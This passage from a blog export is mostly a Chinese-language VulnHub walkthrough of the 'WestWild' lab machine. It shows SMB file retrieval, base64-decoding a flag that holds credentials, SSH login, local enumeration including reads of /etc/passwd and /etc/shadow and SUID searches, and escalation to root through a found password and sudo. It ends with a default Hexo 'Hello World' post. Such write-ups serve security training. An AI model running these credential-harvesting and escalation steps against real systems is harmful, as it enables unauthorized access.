2019<br>  FLAG1.txt                           N       93  Mon Jul 29 22:31:05 2019<br>  message_from_aveng.txt              N      115  Tue Jul 30 01:21:48 2019<br><br>1781464 blocks of size 1024. 285752 blocks available<br></code></pre></td></tr></table></figure><p>把文件下载下来看看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ smbget smb://192.168.56.107/wave/FLAG1.txt<br>Password for [kali] connecting to //wave/192.168.56.107: <br>Using workgroup WORKGROUP, user kali<br>smb://192.168.56.107/wave/FLAG1.txt                                                             <br>Downloaded 93b in 4 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ cat FLAG1.txt <br>RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K<br><br>┌──(kali㉿kali)-[~]<br>└─$ smbget smb://192.168.56.107/wave/message_from_aveng.txt<br>Password for [kali] connecting to //wave/192.168.56.107: <br>Using workgroup WORKGROUP, user kali<br>smb://192.168.56.107/wave/message_from_aveng.txt                                 <br>Downloaded 115b in 1 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ cat message_from_aveng.txt <br>Dear Wave ,<br>Am Sorry but i was lost my password ,<br>and i believe that you can reset  it for me . <br>Thank You <br>Aveng<br></code></pre></td></tr></table></figure><p>感觉是经过编码后的字符串，尝试一下 base64 解码。此外另一个文件得到了一个关键信息，或许这个用户有特殊的权限或者文件来帮助 aveng 来重置其密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ echo -e &quot;RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K&quot; | base64 -d<br>Flag1&#123;Welcome_T0_THE-W3ST-W1LD-B0rder&#125;<br>user:wavex<br>password:door+open<br><br></code></pre></td></tr></table></figure><p>得到用户名和密码，ssh 登录试试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ ssh wavex@192.168.56.107                  <br>The authenticity of host &#x27;192.168.56.107 (192.168.56.107)&#x27; can\&#x27;t be established.<br>ED25519 key fingerprint is SHA256:oeuytnbnPest0/m/OtTQyjaFSRv03+EMhBmAX886bsk.<br>This key is not known by any other names<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added &#x27;192.168.56.107&#x27; (ED25519) to the list of known hosts.<br>wavex@192.168.56.107\&#x27;s password: <br>Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)<br><br> * Documentation:  https://help.ubuntu.com/<br><br>  System information as of Thu May 25 10:10:12 +03 2023<br><br>  System load: 0.0               Memory usage: 3%   Processes:       92<br>  Usage of /:  77.9% of 1.70GB   Swap usage:   0%   Users logged in: 0<br><br>  Graph this data and manage this system at:<br>    https://landscape.canonical.com/<br><br>Your Hardware Enablement Stack (HWE) is supported until April 2019.<br>Last login: Fri Aug  2 02:00:40 2019<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>ssh 登录成功，进行基础的信息收集</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell">wavex@WestWild:~$ whoami<br>wavex<br>wavex@WestWild:~$ ls<br>wave<br>wavex@WestWild:~$ pwd<br>/home/wavex<br>wavex@WestWild:~$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    link/ether 08:00:27:f6:8c:99 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.107/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fef6:8c99/64 scope link <br>       valid_lft forever preferred_lft forever<br>wavex@WestWild:~$ uname -a<br>Linux WestWild 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:28:33 UTC 2019 i686 athlon i686 GNU/Linux<br>wavex@WestWild:~$ sudo -l<br>[sudo] password for wavex: <br>Sorry, user wavex may not run sudo on WestWild.<br></code></pre></td></tr></table></figure><p>查看一些关键文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell">wavex@WestWild:~$ cat /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>sync:x:4:65534:sync:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>libuuid:x:100:101::/var/lib/libuuid:<br>syslog:x:101:104::/home/syslog:/bin/false<br>mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false<br>messagebus:x:103:107::/var/run/dbus:/bin/false<br>landscape:x:104:111::/var/lib/landscape:/bin/false<br>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin<br>aveng:x:1000:1000:aveng,,,:/home/aveng:/bin/bash<br>wavex:x:1001:1001:XxWavexX,,,:/home/wavex:/bin/bash<br>wavex@WestWild:~$ cat /etc/shadow<br>cat: /etc/shadow: Permission denied<br></code></pre></td></tr></table></figure><p>.bashrc 文件也没什么收获，看看 s 权限文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">wavex@WestWild:~$ find / -type f -perm -04000 -ls 2&gt;/dev/null<br> 63292   16 -rwsr-xr-x   1 root     root        13920 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1<br>  1610    8 -rwsr-xr-x   1 root     root         5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device<br> 57897  484 -rwsr-xr-x   1 root     root       492972 Mar  4  2019 /usr/lib/openssh/ssh-keysign<br> 51552  328 -rwsr-xr--   1 root     messagebus   333952 Dec  7  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>  1403   32 -rwsr-xr-x   1 root     root        30984 May 17  2017 /usr/bin/newgrp<br>  1415   48 -rwsr-xr-x   1 root     root        45420 May 17  2017 /usr/bin/passwd<br>  1520  156 -rwsr-xr-x   1 root     root       156708 May 29  2017 /usr/bin/sudo<br> 57785   72 -rwsr-xr-x   1 root     root        72860 Oct 21  2013 /usr/bin/mtr<br> 57389   20 -rwsr-xr-x   1 root     root        18136 May  8  2014 /usr/bin/traceroute6.iputils<br>  1263   36 -rwsr-xr-x   1 root     root        35916 May 17  2017 /usr/bin/chsh<br>  1334   68 -rwsr-xr-x   1 root     root        66284 May 17  2017 /usr/bin/gpasswd<br> 63296   20 -rwsr-xr-x   1 root     root        18168 Jan 15  2019 /usr/bin/pkexec<br>  1260   44 -rwsr-xr-x   1 root     root        44620 May 17  2017 /usr/bin/chfn<br> 59129   48 -rwsr-sr-x   1 daemon   daemon      46652 Oct 21  2013 /usr/bin/at<br> 58179   20 -rwsr-sr-x   1 libuuid  libuuid     17996 Nov 24  2016 /usr/sbin/uuidd<br> 58034  316 -rwsr-xr--   1 root     dip        323000 Jun 12  2018 /usr/sbin/pppd<br>    85   44 -rwsr-xr-x   1 root     root        43316 May  8  2014 /bin/ping6<br> 53426   32 -rwsr-xr-x   1 root     root        30112 May 15  2015 /bin/fusermount<br>    71   88 -rwsr-xr-x   1 root     root        88752 Nov 24  2016 /bin/mount<br>    84   40 -rwsr-xr-x   1 root     root        38932 May  8  2014 /bin/ping<br>   112   68 -rwsr-xr-x   1 root     root        67704 Nov 24  2016 /bin/umount<br>   104   36 -rwsr-xr-x   1 root     root        35300 May 17  2017 /bin/su<br> 59488   36 -rwsr-xr-x   1 root     root        34568 Jun 28  2013 /sbin/mount.cifs<br>wavex@WestWild:~$ id<br>uid=1001(wavex) gid=1001(wavex) groups=1001(wavex)<br></code></pre></td></tr></table></figure><p>定时任务呢?</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">wavex@WestWild:/$ cat /etc/crontab<br><span class="hljs-meta prompt_"># </span><span class="language-bash">/etc/crontab: system-wide crontab</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Unlike any other crontab you don<span class="hljs-string">&#x27;t have to run the `crontab&#x27;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">command</span> to install the new version when you edit this file</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">and files <span class="hljs-keyword">in</span> /etc/cron.d. These files also have username fields,</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">that none of the other crontabs <span class="hljs-keyword">do</span>.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">m h dom mon dow user  <span class="hljs-built_in">command</span></span><br>17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )<br><br></code></pre></td></tr></table></figure><h3 id="查看用户可写目录"><a href="#查看用户可写目录" class="headerlink" title="查看用户可写目录"></a>查看用户可写目录</h3><p>依然没有收获。感觉根据另一个文件的提示，这个用户应该有一些特殊的文件和权限。</p><p>看一下这个用户可以写的目录有哪些</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">wavex@WestWild:/usr/share$ find / -writable -type d 2&gt;/dev/null<br>/sys/fs/cgroup/systemd/user/1001.user/1.session<br>/usr/share/av/westsidesecret<br>/home/wavex<br>/home/wavex/.cache<br>/home/wavex/wave<br>/var/lib/php5<br>/var/spool/samba<br>/var/crash<br>/var/tmp<br>/proc/1884/task/1884/fd<br>/proc/1884/fd<br>/proc/1884/map_files<br>/run/user/1001<br>/run/shm<br>/run/lock<br>/tmp<br><br></code></pre></td></tr></table></figure><p>有个目录看起来有点意思，进去看看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">wavex@WestWild:/usr/share$ cd /usr/share/av/westsidesecret<br>wavex@WestWild:/usr/share/av/westsidesecret$ <br>wavex@WestWild:/usr/share/av/westsidesecret$ ls -liah<br>total 12K<br>69633 drwxrwxrwx 2 root  root  4.0K Jul 30  2019 .<br>69583 drwxr-xr-x 3 root  root  4.0K Jul 30  2019 ..<br>69685 -rwxrwxrwx 1 wavex wavex  101 Jul 30  2019 ififoregt.sh<br>wavex@WestWild:/usr/share/av/westsidesecret$ cat ififoregt.sh <br><span class="hljs-meta prompt_"> #</span><span class="language-bash">!/bin/bash</span> <br> figlet &quot;if i foregt so this my way&quot;<br> echo &quot;user:aveng&quot;<br> echo &quot;password:kaizen+80&quot;<br></code></pre></td></tr></table></figure><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>得到了 aveng 的用户名和密码，ssh 登录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell">──(kali㉿kali)-[~]<br>└─$ ssh aveng@192.168.56.107<br>aveng@192.168.56.107\&#x27;s password: <br>Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)<br><br> * Documentation:  https://help.ubuntu.com/<br><br>  System information as of Thu May 25 10:19:42 +03 2023<br><br>  System load:  0.0               Processes:           106<br>  Usage of /:   77.9% of 1.70GB   Users logged in:     0<br>  Memory usage: 10%               IP address for eth0: 192.168.56.107<br>  Swap usage:   0%<br><br>  Graph this data and manage this system at:<br>    https://landscape.canonical.com/<br><br>Your Hardware Enablement Stack (HWE) is supported until April 2019.<br>Last login: Wed Jul 31 19:26:18 2019 from 192.168.59.1<br>aveng@WestWild:~$ id<br>uid=1000(aveng) gid=1000(aveng) groups=1000(aveng),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(sambashare),114(lpadmin)<br>aveng@WestWild:~$ whoami<br>aveng<br>aveng@WestWild:~$ sudo -l<br>[sudo] password for aveng: <br>Matching Defaults entries for aveng on WestWild:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User aveng may run the following commands on WestWild:<br>    (ALL : ALL) ALL<br></code></pre></td></tr></table></figure><p>用户的 <code>sudo -l</code> 显示此用户有全部权限，那就切换用户吧</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell">aveng@WestWild:~$ su -<br>Password: <br>su: Authentication failure<br>aveng@WestWild:~$ sudo su<br>root@WestWild:/home/aveng# id<br>uid=0(root) gid=0(root) groups=0(root)<br>root@WestWild:/home/aveng# ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    link/ether 08:00:27:f6:8c:99 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.107/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fef6:8c99/64 scope link <br>       valid_lft forever preferred_lft forever<br>root@WestWild:/home/aveng# whoami<br>root<br>root@WestWild:/home/aveng# sudo -l<br>Matching Defaults entries for root on WestWild:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User root may run the following commands on WestWild:<br>    (ALL : ALL) ALL<br></code></pre></td></tr></table></figure><p>提权成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@WestWild:/home/aveng# cd /root<br>root@WestWild:~# ls -liah<br>total 36K<br> 7689 drwx------  3 root root 4.0K Aug  2  2019 .<br>    2 drwxr-xr-x 21 root root 4.0K Jul 30  2019 ..<br> 1097 -rw-r--r--  1 root root 3.1K Feb 20  2014 .bashrc<br>69681 drwx------  2 root root 4.0K Jul 31  2019 .cache<br>69869 -rw-r--r--  1 root root  122 Jul 31  2019 FLAG2.txt<br> 1098 -rw-r--r--  1 root root  140 Feb 20  2014 .profile<br>69835 -rw-r--r--  1 root root   75 Jul 31  2019 .selected_editor<br>69677 -rw-------  1 root root 4.9K Jul 31  2019 .viminfo<br>root@WestWild:~# cat FLAG2.txt <br>Flag2&#123;Weeeeeeeeeeeellco0o0om_T0_WestWild&#125;<br><br>Great! take a screenshot and Share it with me in twitter @HashimAlshareff <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/05/d57b13de7450.html"/>
    <url>/2023/05/d57b13de7450.html</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
